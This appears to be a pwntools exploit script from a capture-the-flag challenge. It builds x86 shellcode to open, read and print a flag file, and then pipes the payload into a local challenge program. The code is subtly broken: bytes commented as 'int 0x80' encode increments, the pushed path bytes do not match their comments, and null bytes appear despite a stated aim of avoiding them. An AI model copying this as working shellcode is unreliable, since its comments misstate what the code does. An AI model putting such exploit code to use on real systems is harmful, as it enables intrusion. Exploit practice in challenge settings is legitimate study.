#!/usr/bin/env python3
from pwn import *

base = 0x1337005
sc = b""

syscall1_offset = 100
syscall2_offset = 140
syscall3_offset = 180  
syscall4_offset = 200

for addr in [base + syscall1_offset, base + syscall2_offset, base + syscall3_offset, base + syscall4_offset]:
    sc += b"\xb8" + p32(addr) + b"\x80\x00\x8d\x40\x80\x00\x40"

# Build path on stack
# Instead of null bytes, push something else then modify
sc += b"\x68\x67\x67\x67\x67"      # push 0x67676767
sc += b"\x81\x2c\x24\x67\x67\x67\x00"  # sub dword ptr [esp], 0x00676767 -> leaves 0x00000067
sc += b"\x68\x61\x6c\x66\x2f"      # push 0x2f666c61  ("/fla")
sc += b"\x68\x70\x70\x61\x2f"      # push 0x2f617070  ("/app")
sc += b"\x68\x76\x72\x73\x2f"      # push 0x2f737276  ("/srv")

sc += b"\x89\xe3"  # mov ebx, esp
sc += b"\xb8\x05\x00\x00\x00"  # mov eax, 5 (open)
sc += b"\xb9\x00\x00\x00\x00"  # mov ecx, 0
sc += b"\xba\x00\x00\x00\x00"  # mov edx, 0

curr_len = len(sc)
sc += b"\xe9" + p32((syscall1_offset - curr_len - 5) & 0xffffffff)

while len(sc) < syscall1_offset:
    sc += b"\x40\x48"

sc += b"\x40\x40"  # int 0x80

sc += b"\x89\xc3"  # mov ebx, eax
sc += b"\xb8\x03\x00\x00\x00"  # mov eax, 3 (read)
sc += b"\x89\xe1"  # mov ecx, esp
sc += b"\xba\x64\x00\x00\x00"  # mov edx, 100

curr_len = len(sc)
sc += b"\xe9" + p32((syscall2_offset - curr_len - 5) & 0xffffffff)

while len(sc) < syscall2_offset:
    sc += b"\x40\x48"

sc += b"\x40\x40"

sc += b"\x89\xc2"  # mov edx, eax
sc += b"\xb8\x04\x00\x00\x00"  # mov eax, 4 (write)
sc += b"\xbb\x01\x00\x00\x00"  # mov ebx, 1

curr_len = len(sc)
sc += b"\xe9" + p32((syscall3_offset - curr_len - 5) & 0xffffffff)

while len(sc) < syscall3_offset:
    sc += b"\x40\x48"

sc += b"\x40\x40"

sc += b"\xb8\x01\x00\x00\x00"  # mov eax, 1 (exit)
sc += b"\xbb\x00\x00\x00\x00"  # mov ebx, 0

curr_len = len(sc)
sc += b"\xe9" + p32((syscall4_offset - curr_len - 5) & 0xffffffff)

while len(sc) < syscall4_offset:
    sc += b"\x40\x48"

sc += b"\x40\x40"

exit_loop = len(sc)
sc += b"\xe9" + p32((syscall4_offset - exit_loop - 5) & 0xffffffff)

print("Length:", len(sc))
print("Payload:", sc.hex())

import os
r = os.popen(f'echo "{sc.hex()}" | python chal.py 2>&1').read()
if "bad" in r.lower() or "jmp must be valid" in r:
    print("\nFAILED:")
    print(r)
else:
    print("\nPASSED!")
